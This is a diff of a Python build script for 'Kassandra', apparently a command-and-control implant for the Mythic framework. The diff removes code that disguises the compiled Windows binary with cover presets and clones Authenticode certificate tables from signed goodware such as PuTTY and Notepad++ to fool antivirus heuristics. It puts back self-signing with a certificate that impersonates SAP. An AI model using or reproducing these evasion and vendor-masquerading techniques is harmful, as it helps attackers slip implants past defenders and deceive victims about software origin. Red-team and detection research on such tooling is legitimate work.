@@ -85,30 +85,6 @@ class KassandraAgent(PayloadType):
             default_value=False,
             description="Lab only: write lifecycle diagnostics to %TEMP%\\kassandra_debug.log. Leave off in production.",
         ),
-        BuildParameter(
-            name="binary_filler_preset",
-            parameter_type=BuildParameterType.ChooseOne,
-            choices=["usb-utility", "text-editor", "software-updater", "vpn-helper", "desktop-app"],
-            default_value="usb-utility",
-            description="BinaryFiller cover preset: VERSIONINFO + corpus blobs + GUI import anchors baked at compile time.",
-        ),
-        BuildParameter(
-            name="binary_filler_budget",
-            parameter_type=BuildParameterType.ChooseOne,
-            choices=["conservative", "standard", "aggressive"],
-            default_value="standard",
-            description="BinaryFiller blob budget: conservative≈12KiB, standard≈32KiB, aggressive≈128KiB of low-entropy cover data.",
-        ),
-        BuildParameter(
-            name="binary_filler_cert_donor",
-            parameter_type=BuildParameterType.ChooseOne,
-            choices=["putty-x64", "rufus-4.15", "notepadpp-x64", "sumatrapdf-3.6.1"],
-            default_value="putty-x64",
-            description=(
-                "Authenticode table donor from BinaryFiller bundled goodware. "
-                "Copies WIN_CERTIFICATE for static presence only — signature will NOT cryptographically verify."
-            ),
-        ),
     ]                                             # Array if we want custom parameters during build
     agent_path = pathlib.Path(".") / "Kassandra"                           # Path of Kassandra
     agent_icon_path = agent_path / "agent_functions" / "Kassandra.svg"     # Path of the icon
@@ -118,8 +94,7 @@ class KassandraAgent(PayloadType):
         BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
         BuildStep(step_name="Provisioning C2", step_description="Setting up C2 credentials"),
         BuildStep(step_name="Applying configuration", step_description="Stamping in configuration values"),
-        BuildStep(step_name="Compiling", step_description="Compiling the agent"),
-        BuildStep(step_name="Stamping certificate", step_description="Cloning Authenticode table from goodware donor"),
+        BuildStep(step_name="Compiling", step_description="Compiling the agent")
     ]
 
     async def build(self) -> BuildResponse:
@@ -398,17 +373,9 @@ class KassandraAgent(PayloadType):
             build_command = f"cargo {toolchain} build --release {target} {manifest} {features_flag}"
             filename = f"{agent_build_path.name}/kassandra/target/x86_64-pc-windows-gnu/release/kassandra.exe"
 
-        bf_preset = self.get_parameter("binary_filler_preset") or "usb-utility"
-        bf_budget = self.get_parameter("binary_filler_budget") or "standard"
-        bf_corpus = os.environ.get("BINARY_FILLER_CORPUS", "/opt/bf-corpus")
-
         build_env = {
             **dict(os.environ),
             "RUSTFLAGS": "--remap-path-prefix /Mythic/=/ --remap-path-prefix /root/.cargo/registry/src/=dep/",
-            # BinaryFiller: ops fail policy in build.rs; real corpus required.
-            "BINARY_FILLER_CORPUS": bf_corpus,
-            "BINARY_FILLER_PRESET": bf_preset,
-            "BINARY_FILLER_BUDGET": bf_budget,
         }
 
         proc = await asyncio.create_subprocess_shell(
@@ -435,52 +402,17 @@ class KassandraAgent(PayloadType):
         await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
             PayloadUUID=self.uuid,
             StepName="Compiling",
-            StepStdout=(
-                f"Successfully compiled Kassandra\n"
-                f"BinaryFiller: preset={bf_preset} budget={bf_budget} corpus={bf_corpus}\n"
-                f"{stderr_str}"
-            ),
+            StepStdout=f"Successfully compiled Kassandra\n{stderr_str}",
             StepSuccess=True
         ))
-
-        # Post-link: clone Authenticode table from bundled goodware (static presence only).
-        # Replaces the old self-signed osslsigncode path — signature will NOT verify.
-        bf_donor = self.get_parameter("binary_filler_cert_donor") or "putty-x64"
+        pfx_path = generate_self_signed_cert()
         if output_format == "dll":
-            stamped_name = filename.replace("kassandra.dll", "kassandraStamped.dll")
+            newName = filename.replace("kassandra.dll", "kassandraSigned.dll")
         else:
-            stamped_name = filename.replace("kassandra.exe", "kassandraStamped.exe")
+            newName = filename.replace("kassandra.exe", "kassandraSigned.exe")
+        sign_with_osslsigncode(filename, newName, pfx_path, "infected")
 
-        try:
-            stamp_stdout = stamp_authenticode_from_donor(
-                input_pe=filename,
-                output_pe=stamped_name,
-                donor_id=bf_donor,
-                corpus_root=bf_corpus,
-            )
-        except Exception as e:
-            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                PayloadUUID=self.uuid,
-                StepName="Stamping certificate",
-                StepStdout=f"Authenticode stamp failed (donor={bf_donor}):\n{e}",
-                StepSuccess=False,
-            ))
-            resp.status = BuildStatus.Error
-            resp.build_message = f"Authenticode stamp failed: {e}"
-            return resp
-
-        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-            PayloadUUID=self.uuid,
-            StepName="Stamping certificate",
-            StepStdout=(
-                f"Stamped Authenticode table from donor={bf_donor}\n"
-                f"(INVALID for verification — static security directory only)\n"
-                f"{stamp_stdout}"
-            ),
-            StepSuccess=True,
-        ))
-
-        resp.payload = open(stamped_name, "rb").read()
+        resp.payload = open(newName, "rb").read()
         return resp
 
 
@@ -491,64 +423,49 @@ _DOH_URLS = {
     "google": "https://8.8.8.8/dns-query",
 }
 
-# Bundled goodware PEs known to carry a real Authenticode table (BinaryFiller corpus).
-_CERT_DONOR_FILES = {
-    "putty-x64": "putty-x64.exe",
-    "rufus-4.15": "rufus-4.15.exe",
-    "notepadpp-x64": "notepadpp-x64.exe",
-    "sumatrapdf-3.6.1": "SumatraPDF-3.6.1-64.exe",
-}
-
-
 def _resolve_doh_url(choice, custom_url=""):
     if choice == "custom":
         return custom_url
     return _DOH_URLS.get(choice, "")
 
 
-def stamp_authenticode_from_donor(input_pe, output_pe, donor_id, corpus_root="/opt/bf-corpus"):
-    """Copy WIN_CERTIFICATE / security directory from a signed donor PE onto the agent.
+def generate_self_signed_cert(name="mycodecert", password="infected"):
+    # Paths
+    key = f"{name}.key"
+    crt = f"{name}.crt"
+    pfx = f"{name}.pfx"
 
-    Uses BinaryFiller's `binary-filler stamp-cert`. The resulting signature is
-    cryptographically invalid (image hash mismatch); only the static cert table
-    is present for heuristic feature pollution.
-    """
-    donor_file = _CERT_DONOR_FILES.get(donor_id)
-    if not donor_file:
-        raise ValueError(
-            f"unknown cert donor id {donor_id!r}; "
-            f"expected one of {sorted(_CERT_DONOR_FILES)}"
-        )
+    # Generate private key
+    subprocess.run(["openssl", "genrsa", "-out", key, "2048"], check=True)
 
-    donor_path = pathlib.Path(corpus_root) / "bundled" / donor_file
-    if not donor_path.is_file():
-        raise FileNotFoundError(
-            f"cert donor not found: {donor_path} "
-            f"(is BINARY_FILLER_CORPUS / bundled goodware installed?)"
-        )
+    # Generate self-signed certificate
+    subprocess.run([
+        "openssl", "req", "-new", "-x509",
+        "-key", key,
+        "-out", crt,
+        "-days", "3650",
+        "-subj", "/CN=SAP/O=HANA"
+    ], check=True)
 
-    # Dockerfile installs to /usr/local/bin; fall back to PATH for local/dev.
-    cli = "/usr/local/bin/binary-filler"
-    if not pathlib.Path(cli).is_file():
-        cli = "binary-filler"
+    # Convert to .pfx
+    subprocess.run([
+        "openssl", "pkcs12", "-export",
+        "-out", pfx,
+        "-inkey", key,
+        "-in", crt,
+        "-passout", f"pass:{password}"
+    ], check=True)
 
-    result = subprocess.run(
-        [
-            cli, "stamp-cert",
-            "-d", str(donor_path),
-            "-t", str(input_pe),
-            "-o", str(output_pe),
-        ],
-        check=False,
-        capture_output=True,
-        text=True,
-    )
-    if result.returncode != 0:
-        raise RuntimeError(
-            f"binary-filler stamp-cert exited {result.returncode}\n"
-            f"stdout:\n{result.stdout}\n"
-            f"stderr:\n{result.stderr}"
-        )
-    if not pathlib.Path(output_pe).is_file():
-        raise RuntimeError(f"stamp-cert reported success but output missing: {output_pe}")
-    return (result.stdout or "").strip()
+    return pfx
+
+def sign_with_osslsigncode(input_exe, output_exe, cert_pfx, pfx_pass):
+    subprocess.run([
+        "osslsigncode", "sign",
+        "-pkcs12", cert_pfx,
+        "-pass", pfx_pass,
+        "-n", "Kassandra",
+        "-i", "https://www.sap.com/germany/index.html",
+        "-t", "http://timestamp.digicert.com",
+        "-in", input_exe,
+        "-out", output_exe
+    ], check=True)
